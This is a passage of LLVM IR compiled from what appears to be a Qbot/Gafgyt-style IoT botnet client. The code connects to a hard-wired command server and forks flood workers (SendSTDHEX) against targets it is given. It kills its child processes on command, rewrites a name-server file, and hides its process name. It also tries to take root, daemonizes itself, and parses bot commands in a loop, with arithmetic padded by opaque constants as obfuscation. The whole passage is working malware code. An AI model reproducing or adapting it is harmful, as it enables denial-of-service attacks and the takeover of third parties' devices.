; <label>:376:                                    ; preds = %370
  %377 = load i8**, i8*** %4, align 8
  %378 = getelementptr inbounds i8*, i8** %377, i64 3
  %379 = load i8*, i8** %378, align 8
  %380 = call i32 @atoi(i8* %379) #9
  %381 = icmp slt i32 %380, 1
  br i1 %381, label %382, label %383

; <label>:382:                                    ; preds = %376, %370, %367
  br label %489

; <label>:383:                                    ; preds = %376
  %384 = load i8**, i8*** %4, align 8
  %385 = getelementptr inbounds i8*, i8** %384, i64 1
  %386 = load i8*, i8** %385, align 8
  store i8* %386, i8** %24, align 8
  %387 = load i8**, i8*** %4, align 8
  %388 = getelementptr inbounds i8*, i8** %387, i64 2
  %389 = load i8*, i8** %388, align 8
  %390 = call i32 @atoi(i8* %389) #9
  store i32 %390, i32* %25, align 4
  %391 = load i8**, i8*** %4, align 8
  %392 = getelementptr inbounds i8*, i8** %391, i64 3
  %393 = load i8*, i8** %392, align 8
  %394 = call i32 @atoi(i8* %393) #9
  store i32 %394, i32* %26, align 4
  %395 = load i8*, i8** %24, align 8
  %396 = call i8* @strstr(i8* %395, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %397 = icmp ne i8* %396, null
  br i1 %397, label %398, label %414

; <label>:398:                                    ; preds = %383
  %399 = load i8*, i8** %24, align 8
  %400 = call i8* @strtok(i8* %399, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %400, i8** %27, align 8
  br label %401

; <label>:401:                                    ; preds = %411, %398
  %402 = load i8*, i8** %27, align 8
  %403 = icmp ne i8* %402, null
  br i1 %403, label %404, label %413

; <label>:404:                                    ; preds = %401
  %405 = call i32 @listFork()
  %406 = icmp ne i32 %405, 0
  br i1 %406, label %411, label %407

; <label>:407:                                    ; preds = %404
  %408 = load i8*, i8** %27, align 8
  %409 = load i32, i32* %25, align 4
  %410 = load i32, i32* %26, align 4
  call void @SendSTDHEX(i8* %408, i32 %409, i32 %410)
  call void @_exit(i32 0) #11
  unreachable

; <label>:411:                                    ; preds = %404
  %412 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %412, i8** %27, align 8
  br label %401

; <label>:413:                                    ; preds = %401
  br label %422

; <label>:414:                                    ; preds = %383
  %415 = call i32 @listFork()
  %416 = icmp ne i32 %415, 0
  br i1 %416, label %417, label %418

; <label>:417:                                    ; preds = %414
  br label %489

; <label>:418:                                    ; preds = %414
  %419 = load i8*, i8** %24, align 8
  %420 = load i32, i32* %25, align 4
  %421 = load i32, i32* %26, align 4
  call void @SendSTDHEX(i8* %419, i32 %420, i32 %421)
  call void @_exit(i32 0) #11
  unreachable

; <label>:422:                                    ; preds = %413
  br label %423

; <label>:423:                                    ; preds = %422, %361
  %424 = load i8**, i8*** %4, align 8
  %425 = getelementptr inbounds i8*, i8** %424, i64 0
  %426 = load i8*, i8** %425, align 8
  %427 = call i32 @strcmp(i8* %426, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.117, i32 0, i32 0)) #9
  %428 = icmp ne i32 %427, 0
  br i1 %428, label %471, label %429

; <label>:429:                                    ; preds = %423
  store i32 0, i32* %28, align 4
  store i64 0, i64* %29, align 8
  br label %430

; <label>:430:                                    ; preds = %459, %429
  %431 = load i64, i64* %29, align 8
  %432 = load i64, i64* @numpids, align 8
  %433 = icmp ult i64 %431, %432
  br i1 %433, label %434, label %465

; <label>:434:                                    ; preds = %430
  %435 = load i32*, i32** @pids, align 8
  %436 = load i64, i64* %29, align 8
  %437 = getelementptr inbounds i32, i32* %435, i64 %436
  %438 = load i32, i32* %437, align 4
  %439 = icmp ne i32 %438, 0
  br i1 %439, label %440, label %458

; <label>:440:                                    ; preds = %434
  %441 = load i32*, i32** @pids, align 8
  %442 = load i64, i64* %29, align 8
  %443 = getelementptr inbounds i32, i32* %441, i64 %442
  %444 = load i32, i32* %443, align 4
  %445 = call i32 @getpid() #5
  %446 = icmp ne i32 %444, %445
  br i1 %446, label %447, label %458

; <label>:447:                                    ; preds = %440
  %448 = load i32*, i32** @pids, align 8
  %449 = load i64, i64* %29, align 8
  %450 = getelementptr inbounds i32, i32* %448, i64 %449
  %451 = load i32, i32* %450, align 4
  %452 = call i32 @kill(i32 %451, i32 9) #5
  %453 = load i32, i32* %28, align 4
  %454 = sub i32 %453, -1071922221
  %455 = add i32 %454, 1
  %456 = add i32 %455, -1071922221
  %457 = add nsw i32 %453, 1
  store i32 %456, i32* %28, align 4
  br label %458

; <label>:458:                                    ; preds = %447, %440, %434
  br label %459

; <label>:459:                                    ; preds = %458
  %460 = load i64, i64* %29, align 8
  %461 = add i64 %460, 1681302192523527307
  %462 = add i64 %461, 1
  %463 = sub i64 %462, 1681302192523527307
  %464 = add i64 %460, 1
  store i64 %463, i64* %29, align 8
  br label %430

; <label>:465:                                    ; preds = %430
  %466 = load i32, i32* %28, align 4
  %467 = icmp sgt i32 %466, 0
  br i1 %467, label %468, label %469

; <label>:468:                                    ; preds = %465
  br label %470

; <label>:469:                                    ; preds = %465
  br label %470

; <label>:470:                                    ; preds = %469, %468
  br label %471

; <label>:471:                                    ; preds = %470, %423
  %472 = load i8**, i8*** %4, align 8
  %473 = getelementptr inbounds i8*, i8** %472, i64 0
  %474 = load i8*, i8** %473, align 8
  %475 = call i32 @strcmp(i8* %474, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.118, i32 0, i32 0)) #9
  %476 = icmp ne i32 %475, 0
  br i1 %476, label %478, label %477

; <label>:477:                                    ; preds = %471
  call void @exit(i32 0) #12
  unreachable

; <label>:478:                                    ; preds = %471
  %479 = load i8**, i8*** %4, align 8
  %480 = getelementptr inbounds i8*, i8** %479, i64 0
  %481 = load i8*, i8** %480, align 8
  %482 = call i32 @strcmp(i8* %481, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.119, i32 0, i32 0)) #9
  %483 = icmp ne i32 %482, 0
  br i1 %483, label %489, label %484

; <label>:484:                                    ; preds = %478
  call void @RemoveTempDirs()
  %485 = load i32, i32* @mainCommSock, align 4
  %486 = call i8* @getBuild()
  %487 = call i32 @getEndianness()
  %488 = call i32 (i32, i8*, ...) @sockprintf(i32 %485, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.120, i32 0, i32 0), i8* %486, i32 %487)
  br label %489

; <label>:489:                                    ; preds = %484, %478, %417, %382, %355, %320, %289, %227, %179, %127, %61, %57, %35
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %17 [
    i32 66051, label %13
    i32 50462976, label %14
    i32 33751041, label %15
    i32 16777986, label %16
  ]

; <label>:13:                                     ; preds = %0
  store i32 ptrtoint ([11 x i8]* @.str.123 to i32), i32* %1, align 4
  br label %18

; <label>:14:                                     ; preds = %0
  store i32 ptrtoint ([14 x i8]* @.str.124 to i32), i32* %1, align 4
  br label %18

; <label>:15:                                     ; preds = %0
  store i32 ptrtoint ([13 x i8]* @.str.125 to i32), i32* %1, align 4
  br label %18

; <label>:16:                                     ; preds = %0
  store i32 ptrtoint ([16 x i8]* @.str.126 to i32), i32* %1, align 4
  br label %18

; <label>:17:                                     ; preds = %0
  store i32 ptrtoint ([8 x i8]* @.str.127 to i32), i32* %1, align 4
  br label %18

; <label>:18:                                     ; preds = %17, %16, %15, %14, %13
  %19 = load i32, i32* %1, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add i32 %11, 1695325761
  %13 = add i32 %12, 1
  %14 = sub i32 %13, 1695325761
  %15 = add nsw i32 %11, 1
  %16 = sext i32 %14 to i64
  %17 = icmp eq i64 %16, 1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %25

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* @currentServer, align 4
  %21 = add i32 %20, -131738297
  %22 = add i32 %21, 1
  %23 = sub i32 %22, -131738297
  %24 = add nsw i32 %20, 1
  store i32 %23, i32* @currentServer, align 4
  br label %25

; <label>:25:                                     ; preds = %19, %18
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %27 = load i32, i32* @currentServer, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i8* @strcpy(i8* %26, i8* %30) #5
  store i32 23, i32* %3, align 4
  %32 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %33 = call i8* @strchr(i8* %32, i32 58) #9
  %34 = icmp ne i8* %33, null
  br i1 %34, label %35, label %42

; <label>:35:                                     ; preds = %25
  %36 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %37 = call i8* @strchr(i8* %36, i32 58) #9
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = call i32 @atoi(i8* %38) #9
  store i32 %39, i32* %3, align 4
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %41 = call i8* @strchr(i8* %40, i32 58) #9
  store i8 0, i8* %41, align 1
  br label %42

; <label>:42:                                     ; preds = %35, %25
  %43 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %43, i32* @mainCommSock, align 4
  %44 = load i32, i32* @mainCommSock, align 4
  %45 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %46 = load i32, i32* %3, align 4
  %47 = call i32 @connectTimeout(i32 %44, i8* %45, i32 %46, i32 30)
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %42
  store i32 1, i32* %1, align 4
  br label %51

; <label>:50:                                     ; preds = %42
  store i32 0, i32* %1, align 4
  br label %51

; <label>:51:                                     ; preds = %50, %49
  %52 = load i32, i32* %1, align 4
  ret i32 %52
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.121, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.121, i32 0, i32 0), i32 0) #5
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %16

; <label>:8:                                      ; preds = %0
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.122, i32 0, i32 0), i8** %2, align 8
  %9 = load i8*, i8** %2, align 8
  %10 = call i64 @strlen(i8* %9) #9
  store i64 %10, i64* %3, align 8
  %11 = load i16, i16* %1, align 2
  %12 = zext i16 %11 to i32
  %13 = load i8*, i8** %2, align 8
  %14 = load i64, i64* %3, align 8
  %15 = call i64 @write(i32 %12, i8* %13, i64 %14)
  br label %17

; <label>:16:                                     ; preds = %0
  br label %21

; <label>:17:                                     ; preds = %8
  %18 = load i16, i16* %1, align 2
  %19 = zext i16 %18 to i32
  %20 = call i32 @close(i32 %19)
  br label %21

; <label>:21:                                     ; preds = %17, %16
  ret void
}

declare i32 @open(i8*, i32, ...) #1

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.128, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.128, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.128, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, -1
  %40 = and i64 %38, %39
  %41 = xor i64 %38, -1
  %42 = and i64 %36, %41
  %43 = or i64 %40, %42
  %44 = xor i64 %36, %38
  %45 = trunc i64 %43 to i32
  call void @srand(i32 %45) #5
  %46 = call i64 @time(i64* null) #5
  %47 = call i32 @getpid() #5
  %48 = sext i32 %47 to i64
  %49 = xor i64 %46, -1
  %50 = and i64 219556762377676107, %49
  %51 = xor i64 219556762377676107, -1
  %52 = and i64 %46, %51
  %53 = xor i64 %48, -1
  %54 = and i64 %53, 219556762377676107
  %55 = and i64 %48, %51
  %56 = or i64 %50, %52
  %57 = or i64 %54, %55
  %58 = xor i64 %56, %57
  %59 = xor i64 %46, %48
  %60 = trunc i64 %58 to i32
  call void @init_rand(i32 %60)
  %61 = call i32 @fork() #5
  store i32 %61, i32* %7, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %63, label %66

; <label>:63:                                     ; preds = %2
  %64 = load i32, i32* %7, align 4
  %65 = call i32 @waitpid(i32 %64, i32* %9, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:66:                                     ; preds = %2
  %67 = load i32, i32* %7, align 4
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %80, label %69

; <label>:69:                                     ; preds = %66
  %70 = call i32 @fork() #5
  store i32 %70, i32* %8, align 4
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %69
  call void @exit(i32 0) #12
  unreachable

; <label>:73:                                     ; preds = %69
  %74 = load i32, i32* %8, align 4
  %75 = icmp ne i32 %74, 0
  br i1 %75, label %77, label %76

; <label>:76:                                     ; preds = %73
  br label %78

; <label>:77:                                     ; preds = %73
  br label %78

; <label>:78:                                     ; preds = %77, %76
  br label %79

; <label>:79:                                     ; preds = %78
  br label %81

; <label>:80:                                     ; preds = %66
  br label %81

; <label>:81:                                     ; preds = %80, %79
  br label %82

; <label>:82:                                     ; preds = %81
  %83 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0)) #5
  %84 = call i32 @setuid(i32 0) #5
  %85 = call i32 @seteuid(i32 0) #5
  %86 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  br label %87

; <label>:87:                                     ; preds = %93, %82
  %88 = call i32 @fork() #5
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %402

; <label>:90:                                     ; preds = %87
  %91 = call i32 @initConnection()
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %95

; <label>:93:                                     ; preds = %90
  %94 = call i32 @sleep(i32 5)
  br label %87

; <label>:95:                                     ; preds = %90
  %96 = load i32, i32* @mainCommSock, align 4
  %97 = call i8* @getBuild()
  %98 = call i32 @getEndianness()
  %99 = call i32 (i32, i8*, ...) @sockprintf(i32 %96, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.130, i32 0, i32 0), i8* %97, i32 %98)
  call void @UpdateNameSrvs()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %100

; <label>:100:                                    ; preds = %400, %252, %216, %95
  %101 = load i32, i32* @mainCommSock, align 4
  %102 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %103 = call i32 @recvLine(i32 %101, i8* %102, i32 4096)
  store i32 %103, i32* %11, align 4
  %104 = icmp ne i32 %103, -1
  br i1 %104, label %105, label %401

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %12, align 4
  br label %106

; <label>:106:                                    ; preds = %200, %105
  %107 = load i32, i32* %12, align 4
  %108 = sext i32 %107 to i64
  %109 = load i64, i64* @numpids, align 8
  %110 = icmp ult i64 %108, %109
  br i1 %110, label %111, label %207

; <label>:111:                                    ; preds = %106
  %112 = load i32*, i32** @pids, align 8
  %113 = load i32, i32* %12, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i32, i32* %112, i64 %114
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @waitpid(i32 %116, i32* null, i32 1)
  %118 = icmp sgt i32 %117, 0
  br i1 %118, label %119, label %199

; <label>:119:                                    ; preds = %111
  %120 = load i32, i32* %12, align 4
  %121 = add i32 %120, -570723548
  %122 = add i32 %121, 1
  %123 = sub i32 %122, -570723548
  %124 = add nsw i32 %120, 1
  store i32 %123, i32* %14, align 4
  br label %125

; <label>:125:                                    ; preds = %143, %119
  %126 = load i32, i32* %14, align 4
  %127 = zext i32 %126 to i64
  %128 = load i64, i64* @numpids, align 8
  %129 = icmp ult i64 %127, %128
  br i1 %129, label %130, label %150

; <label>:130:                                    ; preds = %125
  %131 = load i32*, i32** @pids, align 8
  %132 = load i32, i32* %14, align 4
  %133 = zext i32 %132 to i64
  %134 = getelementptr inbounds i32, i32* %131, i64 %133
  %135 = load i32, i32* %134, align 4
  %136 = load i32*, i32** @pids, align 8
  %137 = load i32, i32* %14, align 4
  %138 = sub i32 0, 1
  %139 = add i32 %137, %138
  %140 = sub i32 %137, 1
  %141 = zext i32 %139 to i64
  %142 = getelementptr inbounds i32, i32* %136, i64 %141
  store i32 %135, i32* %142, align 4
  br label %143

; <label>:143:                                    ; preds = %130
  %144 = load i32, i32* %14, align 4
  %145 = sub i32 0, %144
  %146 = sub i32 0, 1
  %147 = add i32 %145, %146
  %148 = sub i32 0, %147
  %149 = add i32 %144, 1
  store i32 %148, i32* %14, align 4
  br label %125

; <label>:150:                                    ; preds = %125
  %151 = load i32*, i32** @pids, align 8
  %152 = load i32, i32* %14, align 4
  %153 = sub i32 %152, 1734363654
  %154 = sub i32 %153, 1
  %155 = add i32 %154, 1734363654
  %156 = sub i32 %152, 1
  %157 = zext i32 %155 to i64
  %158 = getelementptr inbounds i32, i32* %151, i64 %157
  store i32 0, i32* %158, align 4
  %159 = load i64, i64* @numpids, align 8
  %160 = sub i64 0, %159
  %161 = sub i64 0, -1
  %162 = add i64 %160, %161
  %163 = sub i64 0, %162
  %164 = add i64 %159, -1
  store i64 %163, i64* @numpids, align 8
  %165 = load i64, i64* @numpids, align 8
  %166 = add i64 %165, -566548655774850157
  %167 = add i64 %166, 1
  %168 = sub i64 %167, -566548655774850157
  %169 = add i64 %165, 1
  %170 = mul i64 %168, 4
  %171 = call noalias i8* @malloc(i64 %170) #5
  %172 = bitcast i8* %171 to i32*
  store i32* %172, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %173

; <label>:173:                                    ; preds = %188, %150
  %174 = load i32, i32* %14, align 4
  %175 = zext i32 %174 to i64
  %176 = load i64, i64* @numpids, align 8
  %177 = icmp ult i64 %175, %176
  br i1 %177, label %178, label %195

; <label>:178:                                    ; preds = %173
  %179 = load i32*, i32** @pids, align 8
  %180 = load i32, i32* %14, align 4
  %181 = zext i32 %180 to i64
  %182 = getelementptr inbounds i32, i32* %179, i64 %181
  %183 = load i32, i32* %182, align 4
  %184 = load i32*, i32** %13, align 8
  %185 = load i32, i32* %14, align 4
  %186 = zext i32 %185 to i64
  %187 = getelementptr inbounds i32, i32* %184, i64 %186
  store i32 %183, i32* %187, align 4
  br label %188

; <label>:188:                                    ; preds = %178
  %189 = load i32, i32* %14, align 4
  %190 = sub i32 0, %189
  %191 = sub i32 0, 1
  %192 = add i32 %190, %191
  %193 = sub i32 0, %192
  %194 = add i32 %189, 1
  store i32 %193, i32* %14, align 4
  br label %173

; <label>:195:                                    ; preds = %173
  %196 = load i32*, i32** @pids, align 8
  %197 = bitcast i32* %196 to i8*
  call void @free(i8* %197) #5
  %198 = load i32*, i32** %13, align 8
  store i32* %198, i32** @pids, align 8
  br label %199

; <label>:199:                                    ; preds = %195, %111
  br label %200

; <label>:200:                                    ; preds = %199
  %201 = load i32, i32* %12, align 4
  %202 = sub i32 0, %201
  %203 = sub i32 0, 1
  %204 = add i32 %202, %203
  %205 = sub i32 0, %204
  %206 = add nsw i32 %201, 1
  store i32 %205, i32* %12, align 4
  br label %106

; <label>:207:                                    ; preds = %106
  %208 = load i32, i32* %11, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %209
  store i8 0, i8* %210, align 1
  %211 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %211)
  %212 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %213 = call i8* @strstr(i8* %212, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0)) #9
  %214 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %215 = icmp eq i8* %213, %214
  br i1 %215, label %216, label %217

; <label>:216:                                    ; preds = %207
  br label %100

; <label>:217:                                    ; preds = %207
  %218 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %219 = call i8* @strstr(i8* %218, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.131, i32 0, i32 0)) #9
  %220 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %221 = icmp eq i8* %219, %220
  br i1 %221, label %222, label %223

; <label>:222:                                    ; preds = %217
  call void @exit(i32 0) #12
  unreachable

; <label>:223:                                    ; preds = %217
  %224 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %224, i8** %15, align 8
  %225 = load i8*, i8** %15, align 8
  %226 = load i8, i8* %225, align 1
  %227 = zext i8 %226 to i32
  %228 = icmp eq i32 %227, 33
  br i1 %228, label %229, label %400

; <label>:229:                                    ; preds = %223
  %230 = load i8*, i8** %15, align 8
  %231 = getelementptr inbounds i8, i8* %230, i64 1
  store i8* %231, i8** %16, align 8
  br label %232

; <label>:232:                                    ; preds = %244, %229
  %233 = load i8*, i8** %16, align 8
  %234 = load i8, i8* %233, align 1
  %235 = zext i8 %234 to i32
  %236 = icmp ne i32 %235, 32
  br i1 %236, label %237, label %242

; <label>:237:                                    ; preds = %232
  %238 = load i8*, i8** %16, align 8
  %239 = load i8, i8* %238, align 1
  %240 = zext i8 %239 to i32
  %241 = icmp ne i32 %240, 0
  br label %242

; <label>:242:                                    ; preds = %237, %232
  %243 = phi i1 [ false, %232 ], [ %241, %237 ]
  br i1 %243, label %244, label %247

; <label>:244:                                    ; preds = %242
  %245 = load i8*, i8** %16, align 8
  %246 = getelementptr inbounds i8, i8* %245, i32 1
  store i8* %246, i8** %16, align 8
  br label %232

; <label>:247:                                    ; preds = %242
  %248 = load i8*, i8** %16, align 8
  %249 = load i8, i8* %248, align 1
  %250 = zext i8 %249 to i32
  %251 = icmp eq i32 %250, 0
  br i1 %251, label %252, label %253

; <label>:252:                                    ; preds = %247
  br label %100

; <label>:253:                                    ; preds = %247
  %254 = load i8*, i8** %16, align 8
  store i8 0, i8* %254, align 1
  %255 = load i8*, i8** %15, align 8
  %256 = getelementptr inbounds i8, i8* %255, i64 1
  store i8* %256, i8** %16, align 8
  %257 = load i8*, i8** %15, align 8
  %258 = load i8*, i8** %16, align 8
  %259 = call i64 @strlen(i8* %258) #9
  %260 = getelementptr inbounds i8, i8* %257, i64 %259
  %261 = getelementptr inbounds i8, i8* %260, i64 2
  store i8* %261, i8** %15, align 8
  br label %262

; <label>:262:                                    ; preds = %287, %253
  %263 = load i8*, i8** %15, align 8
  %264 = load i8*, i8** %15, align 8
  %265 = call i64 @strlen(i8* %264) #9
  %266 = sub i64 0, 1
  %267 = add i64 %265, %266
  %268 = sub i64 %265, 1
  %269 = getelementptr inbounds i8, i8* %263, i64 %267
  %270 = load i8, i8* %269, align 1
  %271 = zext i8 %270 to i32
  %272 = icmp eq i32 %271, 10
  br i1 %272, label %285, label %273

; <label>:273:                                    ; preds = %262
  %274 = load i8*, i8** %15, align 8
  %275 = load i8*, i8** %15, align 8
  %276 = call i64 @strlen(i8* %275) #9
  %277 = add i64 %276, -8735678887456356795
  %278 = sub i64 %277, 1
  %279 = sub i64 %278, -8735678887456356795
  %280 = sub i64 %276, 1
  %281 = getelementptr inbounds i8, i8* %274, i64 %279
  %282 = load i8, i8* %281, align 1
  %283 = zext i8 %282 to i32
  %284 = icmp eq i32 %283, 13
  br label %285

; <label>:285:                                    ; preds = %273, %262
  %286 = phi i1 [ true, %262 ], [ %284, %273 ]
  br i1 %286, label %287, label %296

; <label>:287:                                    ; preds = %285
  %288 = load i8*, i8** %15, align 8
  %289 = load i8*, i8** %15, align 8
  %290 = call i64 @strlen(i8* %289) #9
  %291 = add i64 %290, 5921736130090259250
  %292 = sub i64 %291, 1
  %293 = sub i64 %292, 5921736130090259250
  %294 = sub i64 %290, 1
  %295 = getelementptr inbounds i8, i8* %288, i64 %293
  store i8 0, i8* %295, align 1
  br label %262

; <label>:296:                                    ; preds = %285
  %297 = load i8*, i8** %15, align 8
  store i8* %297, i8** %17, align 8
  br label %298

; <label>:298:                                    ; preds = %310, %296
  %299 = load i8*, i8** %15, align 8
  %300 = load i8, i8* %299, align 1
  %301 = zext i8 %300 to i32
  %302 = icmp ne i32 %301, 32
  br i1 %302, label %303, label %308

; <label>:303:                                    ; preds = %298
  %304 = load i8*, i8** %15, align 8
  %305 = load i8, i8* %304, align 1
  %306 = zext i8 %305 to i32
  %307 = icmp ne i32 %306, 0
  br label %308

; <label>:308:                                    ; preds = %303, %298
  %309 = phi i1 [ false, %298 ], [ %307, %303 ]
  br i1 %309, label %310, label %313

; <label>:310:                                    ; preds = %308
  %311 = load i8*, i8** %15, align 8
  %312 = getelementptr inbounds i8, i8* %311, i32 1
  store i8* %312, i8** %15, align 8
  br label %298

; <label>:313:                                    ; preds = %308
  %314 = load i8*, i8** %15, align 8
  store i8 0, i8* %314, align 1
  %315 = load i8*, i8** %15, align 8
  %316 = getelementptr inbounds i8, i8* %315, i32 1
  store i8* %316, i8** %15, align 8
  %317 = load i8*, i8** %17, align 8
  store i8* %317, i8** %18, align 8
  br label %318

; <label>:318:                                    ; preds = %322, %313
  %319 = load i8*, i8** %18, align 8
  %320 = load i8, i8* %319, align 1
  %321 = icmp ne i8 %320, 0
  br i1 %321, label %322, label %331

; <label>:322:                                    ; preds = %318
  %323 = load i8*, i8** %18, align 8
  %324 = load i8, i8* %323, align 1
  %325 = zext i8 %324 to i32
  %326 = call i32 @toupper(i32 %325) #9
  %327 = trunc i32 %326 to i8
  %328 = load i8*, i8** %18, align 8
